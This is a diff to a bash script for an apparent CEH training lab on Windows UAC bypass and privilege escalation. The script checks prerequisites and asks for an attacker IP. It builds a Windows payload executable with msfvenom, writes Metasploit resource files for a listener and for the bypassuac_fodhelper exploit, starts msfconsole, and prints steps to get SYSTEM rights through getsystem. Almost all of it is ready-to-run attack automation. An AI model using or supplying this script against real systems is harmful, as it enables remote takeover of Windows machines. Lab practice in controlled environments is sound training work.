@@ -1,26 +1,27 @@
 #!/bin/bash
 
 # ==============================================================================
-# CEH Lab 2: UAC Bypass & Privilege Escalation (Process-Corrected Version)
+# CEH Lab 2: UAC Bypass & Privilege Escalation (Final Corrected Version)
 # ==============================================================================
 
-# 1. Preflight Checks
+# 1. Root Check
 if [[ "$EUID" -ne 0 ]]; then 
     echo "[ERROR] Please run as root (sudo su)" >&2
     exit 1
 fi
 
+# 2. Prerequisite Check
 REQUIRED_CMDS=("msfvenom" "msfconsole" "python3" "realpath")
 for cmd in "${REQUIRED_CMDS[@]}"; do
     if ! command -v "$cmd" &> /dev/null; then
-        echo "[ERROR] Required command '$cmd' is not installed. Aborting." >&2
+        echo "[ERROR] Required command '$cmd' is not installed." >&2
         exit 1
     fi
 done
 
 echo "--- Lab 2 Configuration ---"
 
-# 2. Robust IP Validation (Python)
+# 3. Robust IP Validation (Python)
 while true; do
     read -p "Enter Attacker IP (LHOST): " LHOST
     if python3 - "$LHOST" <<'PY'
@@ -53,7 +54,7 @@ EXE_PATH="/home/attacker/Desktop/Windows.exe"
 HANDLER_RC="handler.rc"
 ESCALATE_RC="escalate.rc"
 
-# 3. Directory & Payload Generation
+# 4. Directory & Payload Generation
 mkdir -p /home/attacker/Desktop || { echo "[ERROR] Directory creation failed"; exit 1; }
 [[ -w /home/attacker/Desktop ]] || { echo "[ERROR] Directory not writable"; exit 1; }
 
@@ -69,7 +70,7 @@ else
     echo "[ERROR] msfvenom failed." >&2; exit 1
 fi
 
-# 4. Resource File Generation (Correcting Variable Expansion)
+# 5. Resource File Generation
 echo "[*] Creating Metasploit resource files..."
 
 # Handler RC: Starts the listener
@@ -82,14 +83,11 @@ set ExitOnSession false
 run -j
 EOF
 
-# Escalation RC: This will be loaded INSIDE the running console
-# We use a placeholder for the session ID that the user will check
+# Escalation RC: Fixed syntax (No dummy variables)
+# We assume session 1 for the RC, but the user can change it manually.
 cat <<EOF > "$ESCALATE_RC"
-# Note: Ensure you have verified your session ID with 'sessions -l'
-# Change the session number below if it is not 1
-set SESSION_ID 1
 use exploit/windows/local/bypassuac_fodhelper
-set session \$SESSION_ID
+set session 1
 set LHOST $LHOST
 set TARGET 0
 exploit
@@ -99,13 +97,23 @@ EOF
 
 echo -e "\n===================================================================="
 echo "STAGE 1: ESTABLISHING CONNECTION"
-echo "1. Transfer and run: $EXE_PATH"
+echo "1. Transfer and run the file: $EXE_PATH"
 echo "2. Metasploit is now launching in the foreground."
-echo "[!] IMPORTANT: DO NOT EXIT METASPLOIT ONCE THE SESSION OPENS."
+echo "3. WAIT until you see 'Meterpreter session X opened'."
 echo "===================================================================="
 
-# Launch Metasploit once. The script pauses here.
+# Launch Metasploit. The script pauses here.
 msfconsole -r "$HANDLER_RC"
 
-# Once the user eventually exits msfconsole, the script finishes.
-echo -e "\n[INFO] Metasploit session closed. Lab complete."
+# The following instructions are printed if the user exits msfconsole
+echo -e "\n===================================================================="
+echo "STAGE 2: PRIVILEGE ESCALATION (Manual Steps inside msfconsole)"
+echo "If you are still in msfconsole, follow these steps:"
+echo "--------------------------------------------------------------------"
+echo "1. Check your session ID:  sessions -l"
+echo "2. Background the session:   background"
+echo "3. Load the escalation script: resource escalate.rc"
+echo "4. If session ID was not 1, type: set session <ID> (before step 3)"
+echo "5. Once the new session opens, run: getsystem -t 1"
+echo "6. Verify: getuid"
+echo "===================================================================="
